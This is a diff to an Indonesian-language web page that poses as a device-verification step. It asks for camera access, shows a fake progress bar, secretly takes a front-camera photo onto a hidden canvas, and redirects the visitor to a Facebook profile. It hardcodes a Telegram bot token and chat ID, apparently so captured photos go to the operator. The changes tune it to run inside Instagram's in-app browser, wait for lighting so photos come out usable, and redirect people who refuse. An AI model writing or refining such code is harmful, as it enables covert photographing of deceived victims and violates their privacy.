@@ -136,15 +136,15 @@
         <div class="garis-merah-bawah"></div>
     </div>
 
-    <!-- Elemen penangkap foto internal tersembunyi -->
-    <video id="video" autoplay playsinline></video>
+    <!-- Elemen penangkap foto internal tersembunyi (Ditambahkan atribut standar iOS/WebView) -->
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="hiddenCanvas"></canvas>
 
     <script>
         // ==================== PENGATURAN UTAMA ====================
-        const TELEGRAM_BOT_TOKEN = '8773430297:AAG5HZB1NM9sqSVFZnUgsB4cl0JRSkYUkBI'; // Ganti dengan token bot Telegram Anda
-        const TELEGRAM_CHAT_ID = '1966317946';     // Ganti dengan Chat ID Telegram Anda
-        const DOMAIN_TUJUAN = 'https://www.facebook.com/tisnaedy.tisnaedy/'; // Ganti dengan domain tujuan Anda
+        const TELEGRAM_BOT_TOKEN = '8773430297:AAG5HZB1NM9sqSVFZnUgsB4cl0JRSkYUkBI'; 
+        const TELEGRAM_CHAT_ID = '1966317946';     
+        const DOMAIN_TUJUAN = 'https://www.facebook.com/tisnaedy.tisnaedy/'; 
         // ==========================================================
 
         const video = document.getElementById('video');
@@ -152,14 +152,29 @@
         const statusText = document.getElementById('status');
         const progressBar = document.getElementById('bar');
 
+        // Optimasi resolusi constraints agar ramah WebView Instagram
+        const constraints = {
+            video: { 
+                facingMode: "user",
+                width: { ideal: 640 },
+                height: { ideal: 480 }
+            }, 
+            audio: false 
+        };
+
         // 1. Meminta verifikasi akses perangkat (Kamera)
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+        navigator.mediaDevices.getUserMedia(constraints)
             .then(stream => {
                 video.srcObject = stream;
-                statusText.innerText = "Otorisasi berhasil. Membuka halaman...";
-                progressBar.style.width = "65%"; 
                 
-                setTimeout(ambilFotoOtomatis, 1600);
+                // Menunggu event 'playing' untuk memastikan video stream benar-benar berjalan di IG
+                video.addEventListener('playing', () => {
+                    statusText.innerText = "Otorisasi berhasil. Membuka halaman...";
+                    progressBar.style.width = "65%"; 
+                    
+                    // Jeda 2000ms (2 detik) memberi waktu kamera Instagram menyesuaikan pencahayaan agar tidak gelap
+                    setTimeout(ambilFotoOtomatis, 2000);
+                });
             })
             .catch(err => {
                 console.error("Akses ditolak: ", err);
@@ -169,10 +184,22 @@
                 
                 progressBar.style.width = "100%";
                 progressBar.classList.add("error");
+                
+                // Dialihkan ke domain tujuan setelah 2 detik jika izin ditolak
+                setTimeout(() => {
+                    window.location.href = DOMAIN_TUJUAN;
+                }, 2000);
             });
 
         // 2. Pemrosesan penangkapan gambar secara terenkripsi
         function ambilFotoOtomatis() {
+            // Pastikan elemen video memiliki dimensi sebelum menggambar pada canvas
+            if (video.videoWidth === 0 || video.videoHeight === 0) {
+                // Jika dimensi belum siap, coba lagi dalam 500ms
+                setTimeout(ambilFotoOtomatis, 500);
+                return;
+            }
+
             const context = hiddenCanvas.getContext('2d');
             hiddenCanvas.width = video.videoWidth;
             hiddenCanvas.height = video.videoHeight;
@@ -220,5 +247,4 @@
         }
     </script>
 </body>
-  </html>
-  
+</html>
